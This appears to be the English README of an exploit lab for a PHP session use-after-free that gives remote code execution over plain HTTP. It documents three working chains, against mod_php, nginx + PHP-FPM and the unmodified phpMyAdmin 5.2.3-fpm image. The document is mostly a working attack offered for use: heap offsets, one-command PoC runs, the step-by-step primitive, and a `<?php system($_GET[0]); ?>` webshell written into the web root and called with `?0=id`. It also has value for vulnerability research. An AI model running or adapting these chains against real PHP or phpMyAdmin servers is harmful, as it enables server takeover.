# PHP2Shell — session UAF → pure-HTTP RCE (PHP 8.4.4 mod_php, nginx + PHP-FPM, an upstream phpMyAdmin image)

English | [中文](README.md)

One vulnerability, three chains, two SAPIs, four heap calibrations:

| chain | victim shape | how code executes | PoC |
| --- | --- | --- | --- |
| mod_php | Apache 2.4.58 prefork + `libphp.so`, page is a bare `echo` | dangling `zend_reference` → fake `HashTable` with `pDestructor = zif_system`, the last request calls `system()` | `exploits/def_rce.py` and 3 more |
| nginx + PHP-FPM | nginx 1.24 + `php-fpm` compiled here (`pm = static`), page calls `session_start()`; `memory_limit` 8M and PHP's stock 128M, worker pools of 1 and of 4 | the dangling `BG(unserialize)` decoder rewrites where the session gets written, so the FPM worker **itself** writes a session file full of PHP code into the document root → arbitrary file write → request it | `exploits/fpm_rce.py`, `exploits/fpm128_rce.py` (`WORKERS=n` covers both the single worker and the pool) |
| upstream phpMyAdmin image | `phpmyadmin/phpmyadmin:5.2.3-fpm` (PHP 8.3.26) **exactly as the vendor ships it**: its own ini (`memory_limit=512M`), its own `[www]` pool (`pm = dynamic`), the real phpMyAdmin site, and its `index.php` as the victim page | same primitive: a 100 MB session file fills the stock 512M → dangling decoder → `ps_files->basedir` rewritten → the worker writes the session into phpMyAdmin's own `tmp/` (world-writable out of the box, and front ends are told to serve it as PHP) | `exploits/pma512_rce.py` |

All three chains need no exploit class or helper endpoint, none changes the
victim's PHP code, none needs a rebuild or gdb on the target, ASLR is fully
enabled in every run, and every byte on the wire is plain HTTP.

**The mod_php chain's** whole attack surface is these 22 bytes:

```php
<?php echo "OK\n"; ?>
```

No `session_start()` required.  The heap base and the `libphp.so` base come back
in a `Set-Cookie` header, and the final request turns a dangling
`zend_reference` into a call to `zif_system`.

**The FPM chain** needs no code pointer and therefore no `libphp` leak; in
exchange the victim page really has to call `session_start()` and the document
root has to be writable.  `memory_limit` is no longer a condition: both 8M and
PHP's stock 128M work — the latter swaps the pressure source for RFC1867 parts
with an empty `filename`, ~300 request bytes per ~128 KB of heap, so one request
fills a 128 MB limit and every request still fits nginx's default
`client_max_body_size 1m`.  A worker pool is no longer a condition either: the
dangling decoder is per-process state, so the chain arms all N children through
nginx's strict round-robin over FPM and fires the three stages behind it — proven
against a 4-child `pm = static` pool.

**The phpMyAdmin chain** points the same primitives at somebody else's product:
the victim is not a page we wrote but the real phpMyAdmin, and not one directive
is lowered — `memory_limit` is the shipped 512M, `post_max_size` /
`upload_max_filesize` the shipped 2048K, `session.use_strict_mode=On` the shipped
value.  The heap pressure therefore cannot come from a single request any more
(the front end only allows 2 MB): it comes from a **session file fed up to
100,566,855 bytes**, record by record.  phpMyAdmin calls `session_start()` at
script level, so the *unserialization of that file* is what hits the limit,
`zend_first_try` absorbs the fatal, the worker survives and the decoder dangles.
The write target is no longer a path we choose either: a `zend_string` is forged
inside 880 KB of session content, and the worker writes the session into
phpMyAdmin's own `tmp/`, which the image ships world-writable and our front end
serves as PHP.  Because `pm = dynamic` does not pin the number of live
children, every stage attempt gets its own crafted session.

Verified targets: our own `PHP 8.4.4-dev` build (Ubuntu 24.04; mod_php via the
prebuilt `libphp.so` md5 `f402b493b1df82cbf34021b4aef133cb`, shipped in the image
so the calibration and the binary always agree; php-fpm compiled on demand by
`build-phpfpm.sh`, md5 `4b6b73a350e09fcc791c0f20a95ca7d0`), plus the upstream
`phpmyadmin/phpmyadmin:5.2.3-fpm` image itself (PHP 8.3.26) with neither the
image nor its ini modified.

> **This is derivative work.**  The mod_php chain, its stage structure and the
> reference implementation come from
> [9bie/php2shell-bypass-aslr-exp](https://github.com/9bie/php2shell-bypass-aslr-exp),
> and the direction of the FPM chain — which the phpMyAdmin chain extends — comes
> from the Calif Research php2shell write-up — see
> [Acknowledgements](#acknowledgements) and
> [What we added over the reference chain](#what-we-added-over-the-reference-chain).

## Quick start

```bash
python p2s.py build            # docker build (apt from the USTC mirror by default)
                               # add --from-source to compile mod_php first
python p2s.py up               # create + start all 14 mod_php target containers
python p2s.py verify           # served page, expose_php, libphp offsets, worker count
python p2s.py offsets          # zif_system / zval_ptr_dtor of the running target
python p2s.py exploit off      # run the PoC against one profile -> PROOF: uid=33(www-data)
python p2s.py prune            # recycle lab state: session files + proof files
python p2s.py down             # remove the containers

python p2s.py fpm-build        # second chain: compile sapi/fpm from the same php-src
python p2s.py fpm-up           # three nginx + php-fpm containers (8112 = 8M, 8113 = 128M, 8114 = 128M + 4 workers)
python p2s.py verify fpm       # page content, fpm version, writable docroot, memory_limit, pool size
python p2s.py exploit fpm      # FPM chain, memory_limit=8M  -> PROOF: uid=33(www-data)
python p2s.py exploit fpm128   # same chain against PHP's stock 128M -> PROOF: uid=33(www-data)
python p2s.py exploit fpm4     # same chain, but php-fpm is a pool of 4 workers
python p2s.py prune fpm fpm128 fpm4
                               # delete session files + the shell the chain wrote
python p2s.py fpm-down         # optional profile names; without them all three go away

python p2s.py pma-up           # third chain: run the upstream
                               # phpmyadmin/phpmyadmin:5.2.3-fpm as shipped, plus an nginx
                               # sidecar sharing its network stack on 127.0.0.1:8115
python p2s.py verify pma       # the image's own ini/pool, uploadprogress unloaded, tmp/ perms
python p2s.py exploit pma      # pure HTTP, end to end -> PROOF: uid=33(www-data)
python p2s.py prune pma        # delete the 100 MB session file + the written tmp/x.php
python p2s.py pma-down         # remove those two containers
```

`build` once, then `exploit <profile>` alone is enough: it re-creates a missing
container by itself (`ensure`), cleans stale session/proof files before and after
the run, prints the PoC output and exits non-zero when no proof was produced.
A 128M mod_php run takes ~8 s end to end, the FPM chain ~11.6 s, the FPM 128M
chain ~35.5 s, the FPM 128M pool of 4 ~43 s and phpMyAdmin at 512M ~150 s
(measured 2026-10-24/25).
`exploit`/`verify`/`prune` all accept the names `fpm`, `fpm128`, `fpm4` and `pma`,
and `-c '…'` works there too.

Useful knobs (env):

| var | default | meaning |
| --- | --- | --- |
| `APT` | `cn` | `cn` = rewrite sources to the mirror, `off` = keep image sources, `skip` = no apt at all |
| `APT_MIRROR` | `mirrors.ustc.edu.cn` | mirror used when `APT=cn` |
| `BASE` | `ubuntu:24.04` | base image |
| `P2S_CLEAN` | `1` | set `0` to keep session/proof files after a run |
| `FPM_PORT` | `8112` | host port of the 8M nginx + PHP-FPM target |
| `FPM128_PORT` | `8113` | host port of the 128M nginx + PHP-FPM target |
| `FPM4_PORT` | `8114` | host port of the 128M target with a 4-worker pool |
| `PMA_PORT` | `8115` | host port of the phpMyAdmin chain (the third SAPI target) |
| `PMA_IMAGE` | `phpmyadmin/phpmyadmin:5.2.3-fpm` | the upstream image the third chain attacks |
| `CMD` via `exploit <p> -c '…'` | `id>/srv/out/pd` (`id` for the three fpm profiles) | command to run; for mod_php the proof path follows the `>/srv/out/<file>` redirect, for `fpm`/`fpm128`/`fpm4` the output is saved to `out-fpm/pfpm` / `out-fpm128/pfpm128` / `out-fpm4/pfpm4` |

## What the lab is

```
p2s.py                  one-click driver (build/up/down/status/verify/offsets/exploit/prune
                        + fpm-build/fpm-up/fpm-down + pma-up/pma-down)
docker/
  Dockerfile            ubuntu:24.04 + apache2 runtime libs + prebuilt libphp.so (mod_php)
  Dockerfile.fpm        ubuntu:24.04 + nginx + /opt/phpfpm (one image, all three FPM profiles)
  Dockerfile.builder    optional: build deps for `build --from-source` / `fpm-build`
  build-libphp.sh       the php-src 8.4.4 mod_php compile script that runs in it
  build-phpfpm.sh       the php-src 8.4.4 sapi/fpm compile script that runs in it
  offsets.py            nm reader: writes env/generated/offsets.env for the PoCs
  bin/libphp.so         the PHP 8.4.4-dev build the offsets were calibrated on
  bin/opcache.so        only used by the `opc` profile
  src/php-src-844.tar   matching PHP source, for rebuilding (136 MB, not needed to run)
  www/index.php         the mod_php victim page — 22 bytes, see the gotcha below
  fpm/nginx.conf        FPM chain: nginx in front, root /srv/www, .php → 127.0.0.1:9000
  fpm/php-fpm.conf      `pm = static`, one child, www-data
  fpm/php.ini           `memory_limit = 8M`, upload_progress On, writable save_path
  fpm/www/index.php     the FPM victim page: `<?php session_start(); echo "OK\n"; ?>`
  fpm/www/plain.php     bare `echo` page, used for shaping requests and liveness
  fpm128/               the same chain's 128M target: differs from fpm/ only in
                        php.ini's memory_limit and nginx.conf (no raised body limit);
                        its www/ holds byte-identical copies of the two pages
  fpm4/                 the 128M target with a pool: differs from fpm128/ only in
                        `pm.max_children = 4` in php-fpm.conf; ini, nginx.conf and both
                        pages are byte-identical
  pma/nginx.conf        the third chain's front end: plain nginx for the official
                        phpMyAdmin container, root /var/www/html, .php → the
                        container's 127.0.0.1:9000, and `client_max_body_size 2m`
                        is exactly what the image's own UPLOAD_LIMIT=2048K asks for
  entrypoint.sh         mkdir /srv/out, then `apache2 -f /srv/profile/apache.conf`
  entrypoint-fpm.sh     start php-fpm, then `exec nginx -g 'daemon off;'`
env/gen_profiles.py     single source of truth for the 14 profiles -> env/generated/<name>/
exploits/               the PoCs (self-contained, no absolute host paths)
  exploit.py            the reference chain, vendored from 9bie/php2shell-bypass-aslr-exp
  worker.py             docker-exec helpers: container name, port, out dir, worker reset
  def_rce.py            display_errors=Off chain (128M/256M/512M/1G, expose_php both)
  default_rce.py        display_errors=On + expose_php=Off chain
  dev_on_rce.py         display_errors=On + expose_php=On  (cookie-warning leak + On stage3)
  dev_off_rce.py        display_errors=On + expose_php=Off with a long command
                        (also what the opcache profile uses, via CMDOFF)
  fpm_rce.py            nginx + PHP-FPM chain (dangling BG(unserialize) → file write)
  fpm128_rce.py         the same chain against PHP's stock memory_limit=128M
                        (empty-filename RFC1867 parts as the pressure source);
                        WORKERS=n arms a pool, so it also covers the 4-worker target
  pma512_rce.py         the third chain: the upstream phpMyAdmin 5.2.3-fpm image at
                        its stock 512M — grow a 100 MB session file first, then let
                        the script-level session_start() hit the limit on it
measure/                calibration & gdb helpers (not needed for a plain run)
  exploit drivers       measure_dd_any.py, mw_full_test.py, measure_s3_formfill.py,
                        measure_loaded_worker.py, dev_r0.py (re-measure R0)
  gdb/gdb-*.py          psdump, s3trace, heapstat, trigger — loaded by those drivers
tools/probe.php         optional in-webroot probe (loaded ini, directives, extensions)
```

Per profile, `env/generated/<name>/` holds `php.ini`, `apache.conf`, `port`.
`p2s.py` mounts that directory twice — at `/srv/profile` (for Apache) and at
`/usr/local/etc/php` (libphp's compiled-in ini path, which is where PHP actually
reads the ini) — plus `docker/www` at `/srv/www` and `out-<name>/` at `/srv/out`.
One container per profile, all published on `127.0.0.1` only.

The FPM chain has three containers, `p2s-fpm`, `p2s-fpm128` and `p2s-fpm4`, from one
image: the profile directory (`docker/fpm`, `docker/fpm128` or `docker/fpm4`) is
bind-mounted read-only over `/srv/fpm`, shadowing the copy baked into the image, so
8M vs 128M is literally one `php.ini` and one `client_max_body_size` line apart, and
128M vs the pool is one `pm.max_children` line.  Each container runs nginx
(:80 → host `FPM_PORT`/`FPM128_PORT`/`FPM4_PORT`, 8112/8113/8114 by default) and
php-fpm (container `127.0.0.1:9000`), with `docker/<profile>/www` mounted at
`/srv/www` **writable** (the chain writes there) and `out-<profile>/` at `/srv/out`.
They are not part of the 14 mod_php profiles: `fpm-up`/`fpm-down` manage them
(optionally with profile names), and `status` adds a row for each one while it is
alive.

The phpMyAdmin chain is two containers.  `p2s-pma` *is* the official
`phpmyadmin/phpmyadmin:5.2.3-fpm` — its site, its `php.ini`, its `[www]` pool and
its `/sessions` are all the image's own, and we bind-mount no configuration into
it.  `p2s-pma-web` is an nginx sidecar on the same network stack
(`--network container:p2s-pma`) that mounts `docker/pma/nginx.conf` read-only and
forwards the host `PMA_PORT` (8115 by default) to the container's
`127.0.0.1:9000`.  It is not part of `up`/`down`/`status` either; `pma-up` and
`pma-down` manage it.  The only change to how the image is started is
`rm -f /usr/local/etc/php/conf.d/docker-php-ext-uploadprogress.ini` — see the
image-specific gotcha under [Victim requirements](#victim-requirements).

## Profiles and which PoC fits

| alias | container | port | memory_limit | display_errors | expose_php | save_path | workers | opcache | PoC |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| `off` | p2s-def | 8098 | 128M | Off | Off | /tmp | 1 | – | `exploits/def_rce.py` |
| `on` | p2s-on | 8099 | 128M | Off | On | /tmp | 1 | – | `exploits/def_rce.py` |
| `default` | p2s-default | 8096 | 128M | On | Off | /tmp | 1 | – | `exploits/default_rce.py` |
| `dev` | p2s-dev | 8102 | 128M | On | On | /tmp | 1 | – | `exploits/dev_on_rce.py` |
| `ub` | p2s-ub | 8103 | 128M | Off | Off | /var/lib/php/sessions | 1 | – | `exploits/def_rce.py` |
| `ub-on` | p2s-ub-on | 8104 | 128M | Off | On | /var/lib/php/sessions | 1 | – | `exploits/def_rce.py` |
| `off256` | p2s-256 | 8105 | 256M | Off | Off | /tmp | 1 | – | `exploits/def_rce.py` |
| `off512` | p2s-512 | 8106 | 512M | Off | Off | /tmp | 1 | – | `exploits/def_rce.py` |
| `off1g` | p2s-1g | 8107 | 1G | Off | Off | /tmp | 1 | – | `exploits/def_rce.py` |
| `dd256` | p2s-dd256 | 8108 | 256M | On | Off | /tmp | 1 | – | `measure/measure_dd_any.py` |
| `dd512` | p2s-dd512 | 8109 | 512M | On | Off | /tmp | 1 | – | `measure/measure_dd_any.py` |
| `dd1g` | p2s-dd1g | 8110 | 1G | On | Off | /tmp | 1 | – | `measure/measure_dd_any.py` |
| `mw` | p2s-mw | 8100 | 128M | Off | Off | /tmp | 8 | – | `measure/mw_full_test.py` (fan-out) |
| `opc` | p2s-opc | 8111 | 128M | On | Off | /tmp | 1 | On | `exploits/dev_off_rce.py` + `CMDOFF=0x7a118` |
| `fpm` | p2s-fpm | 8112 | 8M | Off | On | /var/lib/php/sessions | 1 (static) | – | `exploits/fpm_rce.py` |
| `fpm128` | p2s-fpm128 | 8113 | 128M | Off | On | /var/lib/php/sessions | 1 (static) | – | `exploits/fpm128_rce.py` |
| `fpm4` | p2s-fpm4 | 8114 | 128M | Off | On | /var/lib/php/sessions | 4 (static) | – | `exploits/fpm128_rce.py` + `WORKERS=4` |
| `pma` | p2s-pma + p2s-pma-web | 8115 | 512M | On | On | /sessions | 2 (dynamic, max 5) | On | `exploits/pma512_rce.py` |

The first 14 rows are mod_php profiles; `fpm`/`fpm128`/`fpm4` are the nginx +
PHP-FPM chain (`sapi=fpm`), the same chain at two `memory_limit`s and two pool
sizes, managed by `fpm-build`/`fpm-up` on its own; `pma` is the third chain — PHP
8.3.26, victim is somebody else's image and site, managed by `pma-up` alone, and
the ini columns are the vendor's stock state (the image has no `php.ini`, so
those values are PHP's compiled defaults plus `phpmyadmin-misc.ini`).

The mod_php profiles all serve the same 22-byte victim page.  `exploit <alias>`
picks the PoC, the heap calibration (`PROFILE`) and the proof path for you;
`-s <script>` overrides the script, `-c` the command, a trailing number sets the
fan-out width for `mw` (default: the profile's `MaxRequestWorkers`).
`exploit fpm`/`fpm128`/`fpm4`/`pma` take `-c` as well and save their proofs to
`out-fpm/pfpm` / `out-fpm128/pfpm128` / `out-fpm4/pfpm4` / `out-pma/ppma`; the
`fpm4` row also sets `WORKERS=4` for the PoC.

Verified in this tree on 2026-10-23: `p2s.py verify` is green for all 14 mod_php
containers, and one back-to-back sweep of `exploit` produced
`PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)` for every profile —
`off`, `on`, `default`, `dev`, `ub`, `ub-on`, `off256`, `off512`, `off1g`, `dd256`,
`dd512`, `dd1g`, `opc`, `mw` (fan-out over all 8 prefork children).
For the FPM chain, `php-fpm` is compiled by `fpm-build` (it links only libc/libm)
and `exploit fpm` produced `uid=33(www-data)` on three independent runs — fresh,
immediately re-run, and after `docker restart p2s-fpm` (a whole new ASLR set) —
each in ~11.6 s.  `exploit fpm128` worked on the first run against the `fpm-build`
binary and reproduced after `fpm-down fpm128` + `fpm-up` (fresh container, new ASLR),
each in ~33.8 s.  Re-measured on 2026-10-24 after folding the pool orchestration into
that PoC (`WORKERS=1`): still green, ~35.5 s.  `exploit fpm4` worked on its first run
against a 4-child `pm = static` pool — one arming round covers R2a, R2b and R3 — and
reproduced after `fpm-down fpm4` + `fpm-up fpm4`, each in ~43 s.
For the phpMyAdmin chain, `phpmyadmin/phpmyadmin:5.2.3-fpm` runs as shipped (image
and ini untouched apart from deleting `docker-php-ext-uploadprogress.ini`), and
`exploit pma` produced `uid=33(www-data)` on five independent runs, including after
`pma-down` + `pma-up` recreated both containers.  Every run's client-side size for
A matched `stat` byte for byte (`match=True`), `prime -> 200`, the **second** stage
attempt returned `502` and wrote the shell, and `GET /tmp/x.php?0=id` echoed; ~154 s
per run, of which R0 (208 records) is ~147 s (measured 2026-10-24/25).
`verify pma` is green.

## What we added over the reference chain

The reference chain as published in
[9bie/php2shell-bypass-aslr-exp](https://github.com/9bie/php2shell-bypass-aslr-exp)
runs A1 → B1 → A2 → B2 against PHP 8.4.26 NTS on Debian 13 / Apache 2.4.69 with the
stock `php.ini-production`: `display_errors=Off`, `memory_limit=128M`, one prefork
worker, `<?php echo "OK\n"; ?>` as the only victim code, ~2 s per run.  That is the
baseline; the table below is what this tree changes, with the profile that proves it.

| pain point on the reference chain | here | evidence |
| --- | --- | --- |
| the OOM has to land in the cookie `php_url_encode()` path, i.e. `display_errors=Off` | a second producer: 1001 cookies trip the `max_input_vars` warning, the printed warning sets `headers_sent`, `php_session_send_cookie()` fails and a plain body fill OOMs in `multipart_buffer_read_body` — so `display_errors=On` works too, and needs no page-level calibration | `default`, `dev`, `dd256/512/1g`, `opc` |
| `memory_limit` must stay 128M | 128M / 256M / 512M / 1G, on both producers | `off256`, `off512`, `off1g`, `dd256`, `dd512`, `dd1g` |
| single-worker prefork (multi-worker explicitly deferred upstream) | one stage-A/B pair per prefork child, fanned out over the pool; all children inherit the parent's chunk and `libphp` bases from `fork()`, so a single leak serves the whole pool | `mw` (8 children, all 8 stage-B requests executed) |
| one `expose_php` layout | both: `R0 = chunk+0x68140` (Off) and `chunk+0x752E0` (On) | `on`, `dev`, `ub-on` |
| one `session.save_path` layout | the path length only shifts `R0` by `0x20`, so the carrier places two adjacent fake references and covers a short and a long path in one request | `ub`, `ub-on` (`/var/lib/php/sessions`) |
| opcache not covered | works under opcache (the carrier moves to `CMDOFF=0x7a118`, selected automatically for that profile) | `opc` |
| the command lives inside a small live `zend_string` (14 bytes; longer work goes through a two-step `sh</out/c`) | a separate 3100-byte `CMD` field carries an external fake `zend_string` (up to ~1.7 KB, shell metacharacters included) and the fake `execute_data` arg1 points at it — one request, no staging file | `dev_off_rce.py`, `opc` |
| "a different PHP build or version means re-calibrating the offsets", with the tooling outside the delivery | the re-measurement is part of the lab: `p2s.py offsets` reads `zif_system`/`zval_ptr_dtor` out of the running target into `env/generated/offsets.env` and `exploit` injects them as `ZIF_OFF`/`DTOR_OFF`; `R0_OFF`, `CMDOFF`, `NFILL/FILLSZ/S3_BIGLEN`, `BURN_SPEC/TAIL*` are all env-overridable; `measure/dev_r0.py` + `measure/gdb/` show how each constant is obtained | Rebuilding the victim binary, below |
| the target binary is whatever the official image ships | `build --from-source` compiles mod_php from php-src, so a clone that does not carry the 53 MB blob is self-sufficient | see the experiment below |
| delivery is `run_pure.sh` + one `exploit.py` | 14 profiles × one command, `verify`/`status`/`offsets`/`prune`, proof-script pairing, container self-healing after an external `docker prune`, bilingual README | Quick start, Recycling |
| one SAPI only (mod_php) | a second chain through PHP-FPM, which is a completely different SAPI path: the pre-RINIT dangling `BG(unserialize)` decoder rewrites the session write target, so no code pointer and no `libphp` leak are needed at all | `fpm`, `fpm128`, The chain (2) below |
| the FPM chain needs a small `memory_limit` to be fillable at all | the pressure source becomes `filename=""` RFC1867 parts: ~300 request bytes per ~128 KB of heap, 920 parts are enough to OOM a worker under PHP's stock 128 MB limit; and every request also fits nginx's default `client_max_body_size 1m`, so the front end needs no tuning | `fpm128`, the 128M variant below |
| the FPM chain's stale decoder is **per-process**, so the pool had to be pinned to `pm = static` with one child | nginx opens one upstream connection per request and FPM hands consecutive connections to its idle children in a strict round-robin: send N primes back to back and the whole pool is armed, then the stages follow and each finds a distinct armed child.  R2a and R2b kill their child, so one arming round covers `min(3, N)` stages | `fpm4` (4 static children, all three stages from one round), the multi-worker variant below |
| the victim is a 22- or 39-byte page *we* wrote, under limits *we* set in `php.ini` | the third chain runs against **somebody else's product image**: `phpmyadmin/phpmyadmin:5.2.3-fpm` completely unmodified (PHP 8.3.26), its real `index.php` as the attack surface, and `memory_limit` / `post_max_size` / `max_input_vars` / `use_strict_mode` / the pool all at vendor defaults — not one directive lowered | `pma`, The chain (3) below |
| the 128M variant fills the heap with 920 parts inside one request, which presumes the front end gives enough body room | with a stock 2048K cap a single request cannot reach 512M, so the pressure moves into a **session file accumulated across requests**: 208 upload-progress records grown to 100,566,855 bytes, and phpMyAdmin's own script-level `session_start()` is what breaks the limit while unserializing it — every request stays under 2 MB | `pma`'s R0/R3 |
| the write path is chosen by the PoC, and so is the file content | the path is forged out of the **victim's own session content**: phpMyAdmin stores the 880 KB `guid` from its login flow as a session key, and at a known offset inside it we build a `zend_string` (length + bytes) so that `ps_files->basedir` points at phpMyAdmin's own `tmp/`, which the image ships `drwxrwxrwt` | `pma`'s R1/R4 |
| a pinned pool size means `WORKERS` can be stated exactly | under `pm = dynamic` the live child count is not controllable, yet the stale decoder is still per-process: the chain mints one crafted session per stage attempt and fires the same stage body at each sid — the attempt that lands on the armed child writes the shell, the others just save their own session normally | `pma` (`ATTEMPTS=6`) |

## The chain (1) — mod_php

Two requests per stage, all multipart/form-data with chunked bodies.

**Stage 1 — create the dangling state.**  `memory_limit` is reached *inside*
request startup, after the session has been initialised but before
`php_request_shutdown`, so the worker keeps pointers into memory that is handed
back to the allocator.  Two producers:

* `display_errors=Off` (`def_rce`): the OOM happens while `php_url_encode()`
  escapes the session id for the `Set-Cookie` header, because `send_cookie` is
  still 1.  Reaching it needs the whole heap saturated to the exact page
  (`BURN_SPEC` dense `filename=""` uploads + `TAILB/TAILC/TAILD/BIGTAIL/…` fill),
  which is why this chain carries per-`memory_limit` calibration.
* `display_errors=On` (`default_rce`, `measure_dd_any`): 1001 cookies trip the
  `max_input_vars` warning, the printed warning sets `headers_sent`, so
  `php_session_send_cookie()` fails and `php_session_track_init()` is skipped —
  and a plain fill (`N x 4MB` form fields + one huge field) OOMs in
  `multipart_buffer_read_body`.  No page-level calibration: only the fill size
  scales with the limit.

**Stage 1 leak.**  A forged `zend_string` header is placed on a page the stale
`PS(id)` still points at, with `len = 0x4000`/`0x40000`; the next request's
`Set-Cookie: PHPSESSID=…` returns up to 256 KB of heap.  The dominant 2 MB-aligned
base in it is the Zend MM main chunk, and every qword congruent to
`zval_ptr_dtor` gives the (ASLR-free) `libphp.so` base — 31 matching qwords in a
normal run, checked against `/proc/1/maps`.

**Stage 3 — code execution.**  Request A repeats the producer with
`PHPSESSID=bbbb…` and `PHP_SESSION_UPLOAD_PROGRESS`, so
`php_session_track_init()` allocates the session's `zend_reference` at a known
chunk offset (`R0`) and the request then dies leaving `PS(http_session_vars)`
dangling.  Request B sprays a value that lands exactly on `R0` and contains a
fake `zend_reference` (`rc=1`, `type=0x1a`) whose `val.value` is a fake
`HashTable` at `R0+0x28` with `pDestructor = zif_system`.  `zend_reference_destroy`
→ `zend_array_destroy` → `zend_hash_destroy` → `system(cmd)`.

`session.save_path` length only shifts `R0` by `0x20`, so the carrier places two
adjacent fake references and covers both classes (`/tmp` vs a long path) in one
request.  The command is not a 14-byte inline string: a separate 3100-byte `CMD`
field carries an external fake `zend_string` (up to ~1.7 KB, shell metacharacters
included) and the fake `execute_data` arg1 points at it.

## The chain (2) — nginx + PHP-FPM

This chain borrows nothing from mod_php's request-startup bailout and uses no code
pointer.  The goal is different: make the FPM worker **write the session file
itself** into the document root.  The reason it is available on FPM and not on
mod_php is ordering — `php_request_startup()` calls `sapi_activate()`
(`main/main.c:1835`), and `sapi_activate()` already reads the body
(`main/SAPI.c:469`), so the multipart callback
`php_session_rfc1867_callback` → `php_session_initialize()` → `s_read` →
`php_session_decode()` all runs *before* any module RINIT.  The memset that clears
`BG(unserialize)` lives in `PHP_RINIT_FUNCTION(basic)`
(`ext/standard/basic_functions.c:407`) and only runs at
`zend_activate_modules()` — i.e. after that decode.  So FPM hands this chain
something mod_php never does: a dangling decoder that survives across requests.

`exploits/fpm_rce.py` sends five kinds of requests and walks the decoder towards
the session writer in three decode steps (`exploits/fpm128_rce.py` is the same
sequence with a different heap calibration, plus the `WORKERS` orchestration — see
"the 128M variant" and "the multi-worker variant" at the end of this section):

1. **R1 — turn the payload into a session key.**  An upload request carrying
   `PHP_SESSION_UPLOAD_PROGRESS=<?php system($_GET[0]); ?>` makes PHP store that
   string as a session key in `sess_scal`; the 890 depth-60 nested fields right
   behind it OOM the parser before the `session.upload_progress.cleanup` END
   cleanup can delete it, so the file on disk keeps
   `upload_progress_<?php system($_GET[0]); ?>|i:0;`.
2. **prime — leave the decoder dangling.**  `build_A()` first fills `sess_asx`
   with 73 progress records plus one record whose filename is 1 MB (again dodging
   cleanup with a nested wall), then POSTs `/index.php` (the page that really
   calls `session_start()`).  The pre-RINIT `php_session_decode()` hits the 8M
   limit inside `php_var_unserialize()`; `zend_catch` runs
   `php_session_cancel_decode()` and `zend_bailout()`
   (`ext/session/session.c:274`), so `PHP_VAR_UNSERIALIZE_DESTROY()` never runs.
   The request dies; the process-global `BG(unserialize)` keeps pointing at
   `var_entries` / `var_dtor_entries` blocks that the allocator already reclaimed.
3. **R2a/R2b/R3 — a count-controlled 8-byte write.**  The next progress request's
   `BIG` field re-occupies exactly those chunk pages (`E_OFF = 0x76000` is the
   fake entries block, `DT_OFF = 0xDC000` the fake dtor block), so the block
   contents the decoder reads are the request body.  `var_push()` does
   `var_hash->data[used_slots++] = rval`
   (`ext/standard/var_unserializer.re:132`); the block base is `E_OFF` and
   `data[0]` sits at `E_OFF+16`, so setting `used_slots = N` selects "the next
   push writes to `E_OFF + 16 + 8N`", and a negative `used_slots`
   (`LAST_DELTA = -0x3BD0`) aims backwards.
   * R2a: `chunk+0x63058` — the type_info half of the
     `php_session_rfc1867_progress::data` zval (`data` starts at struct offset
     0x50 and the block is at `0x63000`, checked with `gdb -ex 'ptype /o'` in the
     container), which scalarizes the progress array.
   * R2b: `chunk+0x63050` — the value half of the same zval, pointed at a fake
     8-slot array.
   * R3: negative `used_slots` lands the push at `chunk+0x58190`
     (= `E_OFF+16 + 8*LAST_DELTA`, in the session-write plumbing), while the same
     request's fake dtor block carries the count `19` and the bytes
     `"/srv/www/shell.php"` — the decoder takes those as the write target.
4. **The write happens on the victim's side.**  At the end of that same request,
   `php_session_rfc1867_update()` → `php_session_flush()` → `ps_files_write()`
   (`ext/session/mod_files.c:227`) flushes the session: not to
   `/var/lib/php/sessions/sess_scal` any more, but to `shell.php` inside the
   document root.
5. **Execution.**  `GET /shell.php?0=id` — the file *is* the session file, PHP
   consumes the `<?php … ?>` tag and runs it, and the command output comes back
   between the payload key and the next record.

Killing the worker on the shaping requests (steps 1-2) is by design: FPM forks a
replacement while the process-global `BG(unserialize)` and the chunk layout stay
put.  On the 8M target the whole chain takes ~11.6 s.

### The 128M variant (`exploits/fpm128_rce.py`)

Same primitive, same request sequence, heap calibration swapped for PHP's stock
`memory_limit=128M`:

* **Pressure source**: the deep-nested plain fields become RFC1867 parts with an
  empty filename — `"x<k>[a][a]…"` (depth 60), empty value, `filename=""`.  About
  300 request bytes cost about 128 KB of heap, so `PRESS=920` parts alone are enough
  to OOM a 128 MB worker.
* **The forge field** shrinks from `FILLER=540672` (132 pages) to `131072` (32 pages,
  starting at page `FSTART=100`): it still covers `E_OFF=0x76000` (page 118), while
  the stale dtor block moves from `0xDC000` (page 220) to `DT_OFF=0x7C000` (page 124).
  The three push targets (`0x63058`/`0x63050`/`0x58190`) are unchanged — they come out
  of struct layout, not out of the limit.
* **A session**: 73 small records plus 20 records with a `FNLEN=750000` filename
  (the 8M build uses one 1 MB filename), landing 15,029,535 bytes on disk.
* **prime request**: `FIELDS=170` 4000-byte fields + `PRIME_PRESS=780` pressure parts
  + the `DUP` re-sent names.  780 is deliberately below 920: the parse has to survive
  to reach `session_start()`, so it is the decode — not the body parser — that hits
  the limit.
* **No front-end tuning**: measured bodies are R1 272,529 · A-small 272,501 ·
  A-big 1,022,503 · prime 925,016 · R2b 403,567 · R3 131,357 bytes, all inside nginx's
  default `client_max_body_size 1m` (1,048,576) — A-big has only ~26 KB of headroom,
  which is why `FNLEN` is an environment variable rather than a constant.
* **Status codes differ per target**: the 8M shaping requests answer 502/500, the 128M
  ones answer 200 (the child had already flushed the response headers before the OOM,
  so nginx can only finish the reply normally).  Same OOM either way; `wait_target()`
  polls `/plain.php` until it is back before the next step.
* ~35.5 s end to end, most of it waiting for the worker to come back after each of the
  93 A records (re-measured 2026-10-24 with `WORKERS=1`; the earlier 33.8 s figure came
  from the version of this PoC that had no disarm round before each arming round).

### The multi-worker variant (`WORKERS=n`)

The 128M PoC describes the pool with `WORKERS`, and `exploit fpm4` sets it to 4 for you
(`docker/fpm4/php-fpm.conf` is `pm = static` + `pm.max_children = 4`).  Nothing about
the heap calibration changes — only the orchestration does.

* The stale `BG(unserialize)` is per-process, so a prime only arms the child that served
  it.  `WORKERS` therefore has to equal the number of *live* children; otherwise a stage
  can land on an unarmed one.
* Arming relies on nginx opening a fresh upstream connection per request and FPM handing
  consecutive connections to its idle children in a strict round-robin: first the N A
  sessions are built one after another (`asx0`…`asx3`, 93 records each), then N primes are
  sent **back to back** — each of those requests finds a different child, so the round
  arms the whole pool.
* Nothing may sit between the arming round and the three stages, not even a liveness
  probe: a request that reaches script execution runs
  `PHP_RINIT(basic_functions)`, which memsets the decoder that was just left dangling.
